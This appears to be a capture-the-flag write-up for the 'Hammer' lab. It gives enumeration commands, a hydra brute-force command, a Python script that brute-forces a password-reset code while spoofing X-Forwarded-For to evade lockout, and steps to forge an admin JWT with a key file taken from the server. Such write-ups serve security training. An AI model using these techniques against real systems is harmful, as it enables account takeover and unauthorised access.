# Hammer CTF

Hammer is a roller coaster in terms of techniques used. From bypassing not one but two brute force protection mechanism to hacking JWTs you'll have all and something extra!

## Information gathering

### Enumeration

#### nmap

Command:
```sh
nmap -sC -sV -p- 10.10.84.254
```

Results:
```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

#### ffuf

Command:
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.84.254:1337/FUZZ -s -c -v
```

Results:
```sh

server-status
```

## Exploitation

### Foothold
1. After finishing the initial enumeration we can check the login page at `http://10.10.84.254:1337/`
2. Clicking on "View page source" we can see there is a comment left by developer `<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->`
3. Lets build a new wordlist prefixing all the words with `hmr_`; for this task we can wrote a simple bash script:
```sh
#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 input_file"
    exit 1
fi

# Input file from the command-line argument
input_file="$1"

# Define the output file (you can change the name as needed)
output_file="output.txt"

# Ensure the output file is empty before starting
> "$output_file"

# Iterate through each line of the input file
while IFS= read -r line; do
    # Prefix the line with "hmr_" and append to the output file
    echo "hmr_$line" >> "$output_file"
done < "$input_file"

echo "Processing complete. Check $output_file for the results."
```
4. Run the script with initial dictionary used `./prefix_words.sh /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
5. Now we can run ffuf again with the newly created dictionary `ffuf -w /home/kali/Documents/CTF/output.txt -u http://10.10.84.254:1337/FUZZ -s -c -v` as a result we have a new list of directories found:
```sh
hmr_images
hmr_css
hmr_js
hmr_logs
```
6. Checking the content of `hmr_logs` directory will reveal a log file containing an username: `tester@hammer.thm`
```sh

```
7. Check the login `POST` request and get info to build a brute force attack with `hydra`:
```sh
hydra -l tester@hammer.thm -P /usr/share/wordlists/rockyou.txt 10.10.84.254 -s 1337 http-post-form "/:email=tester@hammer.thm&password=^PASS^:Invalid Email or Password"
```
8. The brute force on login is not working so I looked over password reset mechanism:
9. If you try to reset password for an invalid email address you will get an error message saying that email does not exist
10. When you try to reset password for user `tester@hammer.thm` you will be prompted to enter a four digit code in a time frame
11. This way you can validate the email is in use and open a new attack surface
12. Let's generate a list of four digit codes using `crunch 4 4 0123456789 -o 4digits.txt`
13. With the new list we can try to reset password for tester user and brute force the requested digit code protection in the specific timeframe
14. Here we have two problems: there is a brute force mechanism in place that will block you after 5 tries on each PHPSESSID and you only have 180 sec (as per script in the page) to brute force
15. After a couple of tries the brute force mechanism I found can be bypassed using `X-Forwarded-For` header with a different value for each request
16. I wrote a Python script to brute force the code protection":
	
```python
import sys
import requests
import random

def generate_random_ip():
    # Generate a random IP address in the range of valid public IPs
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def send_post_request(url, code):
    # Adding the random X-Forwarded-For header
    headers = {
        'X-Forwarded-For': generate_random_ip(),
        'User-Agent': 'Mozilla/5.0',  # Optional, to emulate a browser request
        'Cookie': 'PHPSESSID=q62hrhvdff0m1q24t3ps21n4vq',
        'Cache-Control': 'max-age=0'
    }

    data = {
        'recovery_code': code,
        's':'100000'
    }
    
    # Sending the POST request with headers and data
    response = requests.post(url, data=data, headers=headers)
    return response

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <filename>")
        sys.exit(1)

    filename = sys.argv[1]
    url = "http://hammer.thm:1337/reset_password.php"

    try:
        with open(filename, 'r') as file:
            for line in file:
                code = line.strip()
                if len(code) != 4 or not code.isdigit():
                    print(f"Invalid code format: {code}")
                    continue

                # Send the request
                response = send_post_request(url, code)

                # Check if the response indicates a redirect (302)
                if not "Invalid or expired recovery code" in response.text:
                    print(f"Success! The correct code is: {code}")
                    break
                else:
                    print(f"Attempt with code {code} failed, status code: {response.status_code}")

    except FileNotFoundError:
        print(f"File {filename} not found!")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

17. Before You run the script you have to make a password reset request for user `tester@hammer.thm` and copy the PHPSESSID and use it in the script
18. The problem is that the script should finish all 10000 codes in under 180 seconds and it can only do under 1200 tries
19. I've tried to ad threads to run multiple requests in parallel, but with no luck, for some reason start throwing errors after some requests
20. To solve the problem I have splitted the dictionary containing codes in 10 different dictionaries, run the script in parallel with smaller dictionaries (0000-0999, 1000-1999, etc.) and I managed to get the correct code and reset password 

#### Data exfiltration
1. With the new password I have logged into testers account and get the console flag: **[FirstFlag]**
2. In the command interface you are allowed to send commands to backend server, but the `user` is limited to running `ls` command only which will output:
 ```sh
188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor
```
3. Checking the log in mechanism we can see is using bearer token in JWT format
4. Looking at the JWT header by decoding from base64 we can see is comprised of three main elements:
```sh
{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}
```
5. The JWT payload contains information about logged user including role
```sh
{"iss":"http://hammer.thm","aud":"http://hammer.thm","iat":1725629343,"exp":1725632943,"data":{"user_id":1,"email":"tester@hammer.thm","role":"user"}}
```
6. At this point I'm thinking on elevating my role by changing value from `user` to `admin` or `administrator`
7. For this I'll need to change the JWT payload which will modify the last part: JWT signature
8. To change the signature according to body modifications I'll need a valid key ID `kid` to sign with
9. After I've tried a couple of stuff like changing the algorithm to `None` and removing signature leaving only the trail dot, or brute force the JWT itself I looked over the files listed before and I saw an interesting one `188ade1.key`
10. I took the file from the server and checked the content:
```sh
wget http://hammer.thm:1337/188ade1.key

cat 188ade1.key         
56058354efb3daa97ebab00fabd7a7d7
```
11. With this secret found I installed `JWT Editor` extension in Burp Suite and I generated a new symmetric key
12. I've changed the `kid` in JWT header to point to the file on the server `/var/www/html/188ade1.key` and the role in the JWT payload to `admin` like:
```sh
#header
{  
    "kid": "/var/www/html/188ade1.key",  
    "typ": "JWT",  
    "alg": "HS256"  
}
#payloads 
{  
    "iss": "http://hammer.thm",  
    "aud": "http://hammer.thm",  
    "iat": 1725629343,  
    "exp": 1725632943,  
    "data": {  
        "user_id": 1,  
        "email": "tester@hammer.thm",  
        "role": "admin"  
    }  
}
```
13. Finally I used the symmetric key generated before to sign my changed JWT in JSON Web Token tab in Burp Repeater and I sent the request with command `cat /home/ubuntu/flag.txt` in the body:
```sh
{"command":"cat /home/ubuntu/flag.txt"}
```
14. And I got the final flag: **[SecondFlag]**
